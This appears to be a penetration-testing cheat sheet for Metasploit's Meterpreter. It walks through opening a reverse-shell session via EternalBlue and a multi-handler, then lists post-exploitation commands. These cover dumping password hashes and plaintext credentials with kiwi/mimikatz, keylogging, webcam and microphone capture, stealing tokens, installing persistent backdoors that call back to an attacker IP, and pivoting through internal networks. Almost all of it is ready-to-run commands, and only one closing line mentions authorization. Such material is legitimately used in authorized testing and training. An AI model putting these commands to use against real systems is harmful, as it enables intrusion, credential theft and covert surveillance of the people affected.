# Meterpreter Basics

## What is Meterpreter?
- Meterpreter is an advanced payload in Metasploit Framework
- Stands for Meta-Interpreter
- Runs entirely in memory no files written to disk
- Communicates over encrypted channel
- Extremely powerful post exploitation tool
- Hardest payload to detect by antivirus
- Provides interactive shell with many built in commands
- Supports extensions for additional functionality
- Most commonly used payload in penetration testing

---

## Why Use Meterpreter?
- Runs in memory making it stealthy
- Encrypted communication hard to detect
- Many built in commands no need for extra tools
- Can upload and download files easily
- Can capture screenshots and keystrokes
- Can pivot through networks
- Can escalate privileges
- Supports multiple platforms Windows Linux Android
- Can load additional modules on the fly

---

## Getting Meterpreter Session

### Using Exploit Module
```bash
# use exploit
use exploit/windows/smb/ms17_010_eternalblue

# set meterpreter payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# set options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set LPORT 4444

# run exploit
exploit

# success message
# [*] Meterpreter session 1 opened

# interact with session
sessions -i 1
```

### Using Multi Handler
```bash
# use multi handler
use exploit/multi/handler

# set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# set options
set LHOST 192.168.1.100
set LPORT 4444

# run in background
exploit -j

# when payload executes on target session opens
sessions -i 1
```

---

## Meterpreter Prompt
```
meterpreter >
```
- All meterpreter commands typed here
- Different from regular shell prompt
- Has autocomplete with Tab key
- Has command history with Up arrow

---

## Core Meterpreter Commands

### help
```bash
# show all meterpreter commands
help

# show help for specific command
help upload
help download
help getsystem
```

### background
```bash
# send session to background
background
bg

# go back to msf prompt
# session still active in background
# interact again with sessions -i 1
```

### exit and quit
```bash
# terminate meterpreter session
exit
quit
```

---

## System Information Commands

### sysinfo
```bash
# show target system information
sysinfo

# shows:
# computer name
# operating system
# architecture x86 or x64
# system language
# logged on users
# meterpreter type
```

### getuid
```bash
# show current user running meterpreter
getuid

# shows: Server username: NT AUTHORITY\SYSTEM
# or: Server username: DESKTOP-ABC\user
```

### getpid
```bash
# show process ID of meterpreter
getpid
```

### ps
```bash
# list all running processes on target
ps

# shows:
# PID → process ID
# PPID → parent process ID
# Name → process name
# Arch → architecture
# User → running user
# Path → full path of process
```

### pwd
```bash
# show current directory on target
pwd
```

### getwd
```bash
# same as pwd show working directory
getwd
```

---

## File System Commands

### ls
```bash
# list files in current directory
ls

# list files in specific directory
ls C:\\Users
ls /home
```

### cd
```bash
# change directory on target
cd C:\\Users\\Administrator
cd /tmp
cd ..
```

### cat
```bash
# read file contents
cat C:\\Users\\Administrator\\passwords.txt
cat /etc/passwd
cat /etc/shadow
```

### upload
```bash
# upload file from attacker to target
upload /home/kali/tool.exe C:\\Windows\\Temp\\tool.exe
upload /home/kali/script.ps1 C:\\Temp\\script.ps1

# upload entire directory
upload /home/kali/tools/ C:\\Temp\\tools\\
```

### download
```bash
# download file from target to attacker
download C:\\Users\\Administrator\\passwords.txt /home/kali/
download C:\\Windows\\System32\\config\\SAM /home/kali/
download /etc/passwd /home/kali/
download /etc/shadow /home/kali/

# download entire directory
download C:\\Users\\Administrator\\Documents /home/kali/loot/
```

### mkdir
```bash
# create directory on target
mkdir C:\\Temp\\tools
mkdir /tmp/backdoor
```

### rmdir
```bash
# remove directory on target
rmdir C:\\Temp\\tools
```

### rm
```bash
# delete file on target
rm C:\\Temp\\malware.exe
rm /tmp/backdoor.sh
```

### search
```bash
# search for files on target
search -f passwords.txt
search -f *.doc
search -f *.xls
search -d C:\\Users -f *.pdf
search -d / -f flag.txt
```

### edit
```bash
# edit file on target
edit C:\\Temp\\config.txt
```

---

## Network Commands

### ipconfig
```bash
# show network interfaces on target
ipconfig

# shows IP addresses
# shows MAC addresses
# shows network adapters
```

### ifconfig
```bash
# same as ipconfig for Linux targets
ifconfig
```

### arp
```bash
# show ARP table of target
arp

# reveals other hosts on network
```

### netstat
```bash
# show network connections on target
netstat

# shows active connections
# shows listening ports
# reveals other connected hosts
```

### route
```bash
# show routing table of target
route

# useful for network pivoting
```

### portfwd
```bash
# forward port from target to attacker
portfwd add -l 3389 -p 3389 -r 192.168.2.1

# -l → local port on attacker
# -p → remote port on target network
# -r → remote host IP

# list port forwards
portfwd list

# delete port forward
portfwd delete -l 3389
```

---

## Process Commands

### ps
```bash
# list all running processes
ps
```

### migrate
```bash
# migrate meterpreter to another process
migrate 1234
migrate -N explorer.exe
migrate -N svchost.exe
migrate -N lsass.exe

# migrating to stable process keeps session alive
# migrating to SYSTEM process gives higher privileges
# lsass.exe migration can dump credentials
```

### kill
```bash
# kill specific process
kill 1234
```

### execute
```bash
# execute command on target
execute -f cmd.exe
execute -f cmd.exe -i
execute -f powershell.exe -i -H
execute -f calc.exe

# -f → file to execute
# -i → interactive session
# -H → hide window
```

### shell
```bash
# drop into regular command shell
shell

# now in cmd.exe or bash
# type exit to return to meterpreter
```

---

## Privilege Commands

### getsystem
```bash
# attempt to elevate to SYSTEM privileges
getsystem

# tries multiple techniques:
# technique 1: named pipe impersonation
# technique 2: token duplication
# technique 3: named pipe with dropper
```

### getprivs
```bash
# show current privileges
getprivs

# lists all enabled privileges
# SeDebugPrivilege important for migration
```

### steal_token
```bash
# steal token from specific process
steal_token 1234

# inherits privileges of that process
```

### drop_token
```bash
# drop stolen token
drop_token
```

---

## Credential Harvesting Commands

### hashdump
```bash
# dump password hashes from target
hashdump

# shows NTLM hashes
# format: username:RID:LM_hash:NT_hash:::
# can be cracked offline with hashcat or john
```

### load kiwi
```bash
# load kiwi extension mimikatz
load kiwi

# show kiwi commands
help kiwi
```

### kiwi commands
```bash
# dump all credentials
creds_all

# dump plaintext passwords
creds_wdigest

# dump NTLM hashes
creds_msv

# dump kerberos tickets
creds_kerberos

# dump cached credentials
creds_tspkg

# golden ticket attack
golden_ticket_create
```

---

## Surveillance Commands

### screenshot
```bash
# take screenshot of target desktop
screenshot

# saves screenshot to attacker machine
# shows what user currently sees
```

### screenshare
```bash
# live view of target desktop
screenshare

# opens browser with live stream
```

### keyscan_start
```bash
# start keylogger on target
keyscan_start
```

### keyscan_dump
```bash
# dump captured keystrokes
keyscan_dump

# shows everything typed by user
# captures passwords usernames messages
```

### keyscan_stop
```bash
# stop keylogger
keyscan_stop
```

### webcam_list
```bash
# list webcams on target
webcam_list
```

### webcam_snap
```bash
# take snapshot from webcam
webcam_snap

# saves image to attacker machine
```

### webcam_stream
```bash
# live stream from webcam
webcam_stream
```

### record_mic
```bash
# record audio from microphone
record_mic

# record for specific duration
record_mic -d 30
```

---

## Persistence Commands

### persistence
```bash
# install persistent backdoor old method
run persistence -h

# show options
run persistence -X -i 10 -p 4444 -r 192.168.1.100

# -X → start on boot
# -i → reconnect interval seconds
# -p → port
# -r → attacker IP
```

### Persistence via Registry
```bash
# use post module for persistence
background
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP REGISTRY
run
```

---

## Pivoting Commands

### route
```bash
# add route through meterpreter session
# from msf prompt after backgrounding session
background

# add route to internal network
route add 192.168.2.0/24 1
# 1 is session number

# show routes
route print

# delete route
route remove 192.168.2.0/24 1
```

### socks proxy
```bash
# set up SOCKS proxy for pivoting
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# configure proxychains on kali
# then use any tool through pivot
```

---

## Extension Loading

### load
```bash
# load additional extensions
load kiwi
load incognito
load espia
load priv
load python

# show loaded extension commands
help
```

### Incognito Extension
```bash
# load incognito for token manipulation
load incognito

# list available tokens
list_tokens -u
list_tokens -g

# impersonate token
impersonate_token "NT AUTHORITY\\SYSTEM"
impersonate_token "DOMAIN\\Administrator"

# revert to original token
rev2self
```

---

## Meterpreter Scripting

### run command
```bash
# run post exploitation scripts
run post/windows/gather/hashdump
run post/windows/gather/enum_system
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/multi/recon/local_exploit_suggester
```

### Local Exploit Suggester
```bash
# find local privilege escalation exploits
run post/multi/recon/local_exploit_suggester

# suggests exploits based on target OS and patches
# very useful for privilege escalation
```

---


---

## Important Points
- Meterpreter runs in memory leaving minimal forensic trace
- Always migrate to stable process after getting session
- getsystem may fail on patched or hardened systems
- hashdump requires SYSTEM privileges
- load kiwi requires SYSTEM privileges
- Keylogger captures everything typed including passwords
- screenshot and webcam use require careful ethical consideration
- Always use Meterpreter only on authorized systems
- Background sessions with background command not exit
- Document all commands and findings for reporting
```

---

